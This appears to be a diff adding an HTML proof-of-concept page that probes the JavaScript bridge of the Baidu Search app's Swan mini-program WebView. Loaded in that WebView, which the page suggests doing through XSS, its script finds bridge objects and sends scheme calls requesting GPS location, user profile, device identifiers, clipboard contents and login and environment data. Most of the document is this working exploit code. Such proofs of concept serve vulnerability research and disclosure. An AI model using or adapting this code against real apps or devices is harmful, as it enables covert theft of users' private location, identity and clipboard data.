@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Baidu Swan JSB Security Assessment - PoC</title>
+<style>
+  body { font-family: -apple-system, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
+  h1 { color: #333; border-bottom: 2px solid #e74c3c; padding-bottom: 8px; }
+  h2 { color: #555; margin-top: 24px; }
+  .card { background: #fff; border-radius: 8px; padding: 16px; margin: 12px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+  .card h3 { margin-top: 0; }
+  code { background: #f0f0f0; padding: 2px 6px; border-radius: 3px; font-size: 13px; }
+  pre { background: #2d2d2d; color: #f8f8f2; padding: 16px; border-radius: 8px; overflow-x: auto; }
+  .btn { display: inline-block; padding: 10px 20px; margin: 4px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; }
+  .btn-primary { background: #3498db; color: #fff; }
+  .btn-danger { background: #e74c3c; color: #fff; }
+  .btn-success { background: #2ecc71; color: #fff; }
+  .btn-warning { background: #f39c12; color: #fff; }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .result { margin-top: 8px; padding: 8px; border-radius: 4px; }
+  .result.success { background: #d5f5e3; color: #27ae60; }
+  .result.error { background: #fadbd8; color: #e74c3c; }
+  .result.info { background: #d6eaf8; color: #2980b9; }
+  #log { max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px; background: #1a1a2e; color: #0f0; padding: 12px; border-radius: 8px; }
+  .note { background: #fff3cd; border: 1px solid #ffc107; padding: 10px; border-radius: 6px; margin: 12px 0; }
+  .tag { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 11px; font-weight: bold; margin-right: 4px; }
+  .tag-critical { background: #e74c3c; color: #fff; }
+  .tag-high { background: #f39c12; color: #fff; }
+  .tag-medium { background: #3498db; color: #fff; }
+</style>
+</head>
+<body>
+
+<h1>🔴 Baidu Search APP - Swan JSB Security PoC</h1>
+<p><strong>Note:</strong> This PoC is designed to demonstrate JavaScript Bridge security issues in Baidu Search APP's Swan Mini-Program framework. This page must be loaded inside a WebView that has <code>Bdbox_aiapps_jsbridge</code> registered.</p>
+
+<div class="note">
+  <strong>⚠️ Prerequisites:</strong> This HTML must be loaded inside a Swan mini-program WebView (e.g., via XSS or开发者工具). The JSB interfaces <code>Bdbox_aiapps_jsbridge</code> and <code>Bdbox_android_jsbridge</code> must be available.
+</div>
+
+<h2>📡 JSB Interface Detection</h2>
+<div class="card">
+  <h3>Detect Available Bridges</h3>
+  <button class="btn btn-primary" onclick="detectBridges()">Detect JSB Interfaces</button>
+  <div id="detectResult" class="result"></div>
+</div>
+
+<h2>📍 Location API</h2>
+<div class="card">
+  <p>Attempts to retrieve GPS location via <code>_naLocationService.getLocation</code></p>
+  <button class="btn btn-warning" onclick="getLocation()">Get GPS Location</button>
+  <div id="locationResult" class="result"></div>
+</div>
+
+<h2>👤 User Info API</h2>
+<div class="card">
+  <p>Attempts to retrieve user profile information</p>
+  <button class="btn btn-danger" onclick="getUserInfo()">Get User Info</button>
+  <div id="userInfoResult" class="result"></div>
+</div>
+
+<h2>📱 Device Info API</h2>
+<div class="card">
+  <p>Attempts to retrieve device identifiers (IMEI, AndroidID, etc.)</p>
+  <button class="btn btn-danger" onclick="getDeviceInfo()">Get Device Info</button>
+  <div id="deviceInfoResult" class="result"></div>
+</div>
+
+<h2>📋 Clipboard API</h2>
+<div class="card">
+  <p>Attempts to read clipboard data</p>
+  <button class="btn btn-warning" onclick="getClipboardData()">Read Clipboard</button>
+  <div id="clipboardResult" class="result"></div>
+</div>
+
+<h2>🔓 Account API</h2>
+<div class="card">
+  <p>Checks login status and attempts to retrieve account info</p>
+  <button class="btn btn-danger" onclick="isLoginSync()">Check Login Status</button>
+  <div id="accountResult" class="result"></div>
+</div>
+
+<h2>📄 Console Log</h2>
+<div id="log">[Log output will appear here]</div>
+
+<script>
+// ====== Utility Functions ======
+function log(msg, type) {
+  var el = document.getElementById('log');
+  var entry = document.createElement('div');
+  var ts = new Date().toLocaleTimeString();
+  entry.textContent = '[' + ts + '] ' + msg;
+  entry.style.color = type === 'error' ? '#ff6b6b' : type === 'success' ? '#69db7c' : '#adb5bd';
+  el.appendChild(entry);
+  el.scrollTop = el.scrollHeight;
+}
+
+function showResult(elId, success, msg) {
+  var el = document.getElementById(elId);
+  el.className = 'result ' + (success ? 'success' : 'error');
+  el.textContent = msg;
+  log(msg, success ? 'success' : 'error');
+}
+
+// ====== JSB Dispatch Helper ======
+function callJsBridge(interfaceName, method, params, callback) {
+  var scheme = 'baidubox://' + method;
+  if (params) {
+    var paramStr = Object.keys(params).map(function(k) {
+      return encodeURIComponent(k) + '=' + encodeURIComponent(params[k]);
+    }).join('&');
+    scheme += '?' + paramStr;
+  }
+  
+  var bridge = window[interfaceName];
+  if (!bridge || typeof bridge.dispatch !== 'function') {
+    log('Bridge ' + interfaceName + ' not available', 'error');
+    return null;
+  }
+  
+  // Add callback parameter
+  if (callback) {
+    scheme += (params ? '&' : '?') + 'cb=' + encodeURIComponent(callback);
+  }
+  
+  log('Dispatching via ' + interfaceName + ': ' + scheme, 'info');
+  
+  try {
+    var result = bridge.dispatch(scheme);
+    log('Result: ' + result, 'success');
+    return result;
+  } catch (e) {
+    log('Error: ' + e.message, 'error');
+    return null;
+  }
+}
+
+// ====== Async JSB Dispatch (via location/iframe) ======
+function callJsBridgeAsync(interfaceName, method, params) {
+  var scheme = 'baidubox://' + method;
+  if (params) {
+    var paramStr = Object.keys(params).map(function(k) {
+      return encodeURIComponent(k) + '=' + encodeURIComponent(params[k]);
+    }).join('&');
+    scheme += '?' + paramStr;
+  }
+  
+  var bridge = window[interfaceName];
+  if (!bridge || typeof bridge.dispatch !== 'function') {
+    log('Bridge ' + interfaceName + ' not available (async)', 'error');
+    return false;
+  }
+  
+  log('Dispatching async via ' + interfaceName + ': ' + scheme, 'info');
+  
+  try {
+    var result = bridge.dispatch(scheme);
+    log('Async dispatch triggered, result: ' + result, 'success');
+    return true;
+  } catch (e) {
+    log('Async dispatch error: ' + e.message, 'error');
+    return false;
+  }
+}
+
+// ====== Detection ======
+function detectBridges() {
+  var bridges = [
+    'Bdbox_aiapps_jsbridge',
+    'Bdbox_android_jsbridge', 
+    '_naSwan',
+    'swanPreload',
+    'Bdbox_android_utils'
+  ];
+  
+  var found = [];
+  var notFound = [];
+  
+  bridges.forEach(function(name) {
+    var b = window[name];
+    if (b) {
+      var methods = Object.getOwnPropertyNames(Object.getPrototypeOf(b));
+      var hasDispatch = typeof b.dispatch === 'function';
+      found.push(name + ' (dispatch=' + hasDispatch + ', methods=' + JSON.stringify(methods) + ')');
+      log('Found: ' + name, 'success');
+    } else {
+      notFound.push(name);
+    }
+  });
+  
+  if (found.length > 0) {
+    showResult('detectResult', true, '✅ Found bridges:\n' + found.join('\n'));
+  }
+  if (notFound.length > 0) {
+    showResult('detectResult', false, '❌ Not found: ' + notFound.join(', '));
+  }
+  if (found.length === 0 && notFound.length > 0) {
+    showResult('detectResult', false, '❌ No JSB bridges detected. This page must be loaded in a Swan WebView.');
+  }
+}
+
+// ====== Location ======
+function getLocation() {
+  // Try sync first via _naSwan
+  var naSwan = window['_naSwan'];
+  if (naSwan && typeof naSwan.getEnvVariables === 'function') {
+    log('_naSwan.getEnvVariables() available', 'info');
+  }
+  
+  // Try via async dispatch 
+  var result = callJsBridgeAsync('Bdbox_aiapps_jsbridge', 'api/getLocation', {
+    type: 'wgs84',
+    altitude: 'true',
+    needFullAccuracy: 'true',
+    cb: 'locationCallback'
+  });
+  
+  if (result === null) {
+    showResult('locationResult', false, '❌ Baidbox_aiapps_jsbridge not available');
+  } else {
+    showResult('locationResult', true, '✅ Location request dispatched. Check ADB logcat for response.');
+  }
+}
+
+// ====== User Info ======
+function getUserInfo() {
+  var result = callJsBridgeAsync('Bdbox_aiapps_jsbridge', 'api/getUserInfo', {
+    cb: 'userInfoCallback'  
+  });
+  
+  if (result === null) {
+    showResult('userInfoResult', false, '❌ Bridge not available');
+  } else {
+    showResult('userInfoResult', true, '✅ getUserInfo dispatched');
+  }
+}
+
+// ====== Device Info ======
+function getDeviceInfo() {
+  var result = callJsBridgeAsync('Bdbox_aiapps_jsbridge', 'api/getDeviceInfo', {
+    cb: 'deviceInfoCallback'
+  });
+  
+  if (result === null) {
+    showResult('deviceInfoResult', false, '❌ Bridge not available');
+  } else {
+    showResult('deviceInfoResult', true, '✅ getDeviceInfo dispatched');
+  }
+}
+
+// ====== Clipboard ======
+function getClipboardData() {
+  // Try via _naSwan._naSystem.getClipboardData 
+  var naSwan = window['_naSwan'];
+  if (naSwan) {
+    log('_naSwan available, checking _naSystem...', 'info');
+    // Some implementations expose clipboard via native methods
+  }
+  
+  var result = callJsBridgeAsync('Bdbox_aiapps_jsbridge', 'api/getClipboardData', {
+    cb: 'clipboardCallback'
+  });
+  
+  if (result === null) {
+    showResult('clipboardResult', false, '❌ Bridge not available');
+  } else {
+    showResult('clipboardResult', true, '✅ getClipboardData dispatched');
+  }
+}
+
+// ====== Account ======
+function isLoginSync() {
+  var naSwan = window['_naSwan'];
+  if (naSwan) {
+    // Try synchronous API first
+    try {
+      var envVars = naSwan.getEnvVariables();
+      log('getEnvVariables: ' + JSON.stringify(envVars), 'success');
+    } catch(e) {
+      log('getEnvVariables error: ' + e.message, 'error');
+    }
+  }
+  
+  // Also try via dispatch
+  var result = callJsBridgeAsync('Bdbox_aiapps_jsbridge', 'api/isLogin', {
+    cb: 'loginCallback'
+  });
+  
+  if (result === null) {
+    showResult('accountResult', false, '❌ Bridge not available');
+  } else {
+    showResult('accountResult', true, '✅ Login status check dispatched');
+  }
+}
+
+log('PoC loaded. Click buttons to test each API.', 'info');
+log('JSB interfaces available: ' + (typeof Bdbox_aiapps_jsbridge !== 'undefined'), 'info');
+log('_naSwan available: ' + (typeof _naSwan !== 'undefined'), 'info');
+log('swanPreload available: ' + (typeof swanPreload !== 'undefined'), 'info');
+</script>
+
+</body>
+</html>
